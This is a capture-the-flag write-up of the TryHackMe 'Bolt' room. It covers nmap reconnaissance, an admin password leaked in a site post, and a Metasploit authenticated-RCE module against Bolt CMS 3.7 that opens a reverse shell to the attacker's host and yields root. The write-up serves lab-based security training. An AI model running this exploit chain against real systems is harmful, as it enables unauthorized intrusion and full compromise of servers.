# Bolt

URL: https://tryhackme.com/room/bolt

Level: Easy

Date: 22 July 2023

- [Reconnaissance](#reconnaissance)
	- [NMAP](#nmap)
	- [HTTP](#http)
	- [Bolt CMS](#bolt-cms)
	- [RCE](#rce)
- [Root flag](#root-flag)





## Reconnaissance

### nmap

```bash
$ sudo nmap -T4 -p- 10.10.16.112 -oN nmap
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-22 17:00 CEST
Stats: 0:00:38 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 98.11% done; ETC: 17:01 (0:00:01 remaining)
Nmap scan report for 10.10.16.112
Host is up (0.055s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8000/tcp open  http-alt

Nmap done: 1 IP address (1 host up) scanned in 38.83 seconds

```

### nmap with scripts and version

```bash
joshua@kaligra:~/Documents/thm/bolt$ sudo nmap -T4 -sC -sV -p22,80,8000 10.10.16.112 -oN nmap2
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-22 17:01 CEST
Nmap scan report for 10.10.16.112
Host is up (0.055s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 f385ec54f201b19440de42e821972080 (RSA)
|   256 77c7c1ae314121e4930e9add0b29e1ff (ECDSA)
|_  256 070543469db23ef04d6967e491d3d37f (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8000/tcp open  http    (PHP 7.2.32-1)
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 404 Not Found
|     Date: Sat, 22 Jul 2023 15:01:59 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1
|     Cache-Control: private, must-revalidate
|     Date: Sat, 22 Jul 2023 15:01:59 GMT
|     Content-Type: text/html; charset=UTF-8
|     pragma: no-cache
|     expires: -1
|     X-Debug-Token: 873ad1
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Bolt | A hero is unleashed</title>
|     <link href="https://fonts.googleapis.com/css?family=Bitter|Roboto:400,400i,700" rel="stylesheet">
|     <link rel="stylesheet" href="/theme/base-2018/css/bulma.css?8ca0842ebb">
|     <link rel="stylesheet" href="/theme/base-2018/css/theme.css?6cb66bfe9f">
|     <meta name="generator" content="Bolt">
|     </head>
|     <body>
|     href="#main-content" class="vis
|   GetRequest:
|     HTTP/1.0 200 OK
|     Date: Sat, 22 Jul 2023 15:01:59 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1
|     Cache-Control: public, s-maxage=600
|     Date: Sat, 22 Jul 2023 15:01:59 GMT
|     Content-Type: text/html; charset=UTF-8
|     X-Debug-Token: d4f88f
|     <!doctype html>
|     <html lang="en-GB">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Bolt | A hero is unleashed</title>
|     <link href="https://fonts.googleapis.com/css?family=Bitter|Roboto:400,400i,700" rel="stylesheet">
|     <link rel="stylesheet" href="/theme/base-2018/css/bulma.css?8ca0842ebb">
|     <link rel="stylesheet" href="/theme/base-2018/css/theme.css?6cb66bfe9f">
|     <meta name="generator" content="Bolt">
|     <link rel="canonical" href="http://0.0.0.0:8000/">
|     </head>
|_    <body class="front">
|_http-generator: Bolt
|_http-title: Bolt | A hero is unleashed
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.93%I=7%D=7/22%Time=64BBEF65%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,29E1,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sat,\x2022\x20Jul\x20
SF:2023\x2015:01:59\x20GMT\r\nConnection:\x20close\r\nX-Powered-By:\x20PHP
SF:/7\.2\.32-1\+ubuntu18\.04\.1\+deb\.sury\.org\+1\r\nCache-Control:\x20pu
SF:blic,\x20s-maxage=600\r\nDate:\x20Sat,\x2022\x20Jul\x202023\x2015:01:59
SF:\x20GMT\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\nX-Debug-Toke
SF:n:\x20d4f88f\r\n\r\n<!doctype\x20html>\n<html\x20lang=\"en-GB\">\n\x20\
SF:x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\"u
SF:tf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20
SF:content=\"width=device-width,\x20initial-scale=1\.0\">\n\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<title>Bolt\x20\|\x20A
SF:\x20hero\x20is\x20unleashed</title>\n\x20\x20\x20\x20\x20\x20\x20\x20<l
SF:ink\x20href=\"https://fonts\.googleapis\.com/css\?family=Bitter\|Roboto
SF::400,400i,700\"\x20rel=\"stylesheet\">\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0<link\x20rel=\"stylesheet\"\x20href=\"/theme/base-2018/css/bulma\.css\
SF:?8ca0842ebb\">\n\x20\x20\x20\x20\x20\x20\x20\x20<link\x20rel=\"styleshe
SF:et\"\x20href=\"/theme/base-2018/css/theme\.css\?6cb66bfe9f\">\n\x20\x20
SF:\x20\x20\t<meta\x20name=\"generator\"\x20content=\"Bolt\">\n\x20\x20\x2
SF:0\x20\t<link\x20rel=\"canonical\"\x20href=\"http://0\.0\.0\.0:8000/\">\
SF:n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body\x20class=\"front\">\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20<a\x20")%r(FourOhFourRequest,1527,"HTTP/1
SF:\.0\x20404\x20Not\x20Found\r\nDate:\x20Sat,\x2022\x20Jul\x202023\x2015:
SF:01:59\x20GMT\r\nConnection:\x20close\r\nX-Powered-By:\x20PHP/7\.2\.32-1
SF:\+ubuntu18\.04\.1\+deb\.sury\.org\+1\r\nCache-Control:\x20private,\x20m
SF:ust-revalidate\r\nDate:\x20Sat,\x2022\x20Jul\x202023\x2015:01:59\x20GMT
SF:\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\npragma:\x20no-cache
SF:\r\nexpires:\x20-1\r\nX-Debug-Token:\x20873ad1\r\n\r\n<!doctype\x20html
SF:>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial
SF:-scale=1\.0\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20<title>Bolt\x20\|\x20A\x20hero\x20is\x20unleashed</title>\n\x2
SF:0\x20\x20\x20\x20\x20\x20\x20<link\x20href=\"https://fonts\.googleapis\
SF:.com/css\?family=Bitter\|Roboto:400,400i,700\"\x20rel=\"stylesheet\">\n
SF:\x20\x20\x20\x20\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/
SF:theme/base-2018/css/bulma\.css\?8ca0842ebb\">\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/theme/base-2018/css/them
SF:e\.css\?6cb66bfe9f\">\n\x20\x20\x20\x20\t<meta\x20name=\"generator\"\x2
SF:0content=\"Bolt\">\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body>\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\"#main-content\"\x20class=\"v
SF:is");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.54 seconds
```

### http

On port 80, we get a default Apache welcome page.

On port 8000, there is a website, made with Bolt CMS:


![](Pasted%20image%2020230722170430.png)


We find an interesting post:

http://10.10.16.112:8000/entry/message-for-it-department

*Hey guys,*
*i suppose this is our secret forum right? I posted my first message for our readers today but there seems to be a lot of freespace out there. Please check it out! my password is boltadmin123 just incase you need it!*
*Regars, Jake (Admin)

On another page, we see the admin's username:

http://10.10.16.112:8000/entry/message-from-admin

*Hello Everyone,*
*Welcome to this site, myself Jake and my username is bolt ...*

### bolt cms

We then try to access to backend:

http://10.10.16.112:8000/bolt/login


![](Pasted%20image%2020230722171215.png)

From menu *Configuration* > *Set-up checks* we get CMS's version:

![](Pasted%20image%2020230722171621.png)

### RCE

https://www.exploit-db.com/exploits/48296

There is also a Metasploit module:

```bash
msf6 > search bolt 3.7.1

Matching Modules
================

   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/unix/webapp/bolt_authenticated_rce  2020-05-07       excellent  Yes    Bolt CMS 3.7.0 - Authenticated Remote Code Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/bolt_authenticated_rce

msf6 >

```

Let's configure exploit:

```bash
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set LHOST 10.8.100.14
LHOST => 10.8.100.14
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set USERNAME bolt
USERNAME => bolt
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set PASSWORD boltadmin123
PASSWORD => boltadmin123
msf6 exploit(unix/webapp/bolt_authenticated_rce) > exploit

[-] Msf::OptionValidateError The following options failed to validate: RHOSTS
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set RHOSTS 10.10.16.112
RHOSTS => 10.10.16.112
msf6 exploit(unix/webapp/bolt_authenticated_rce) > exploit

[*] Started reverse TCP handler on 10.8.100.14:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Successfully changed the /bolt/profile username to PHP $_GET variable "uxcw".
[*] Found 3 potential token(s) for creating .php files.
[+] Deleted file hxhviwgj.php.
[+] Deleted file qvsocesp.php.
[+] Used token c13e94f282db75cc283375c164 to create dlcxcgrocz.php.
[*] Attempting to execute the payload via "/files/dlcxcgrocz.php?uxcw=`payload`"
[!] No response, may have executed a blocking payload!
[*] Command shell session 1 opened (10.8.100.14:4444 -> 10.10.16.112:38186) at 2023-07-22 17:20:16 +0200
[+] Deleted file dlcxcgrocz.php.
[+] Reverted user profile back to original state.

id
uid=0(root) gid=0(root) groups=0(root)
```


## root flag

```bash
find / -type f -name flag.txt 2>/dev/null
/home/flag.txt
```

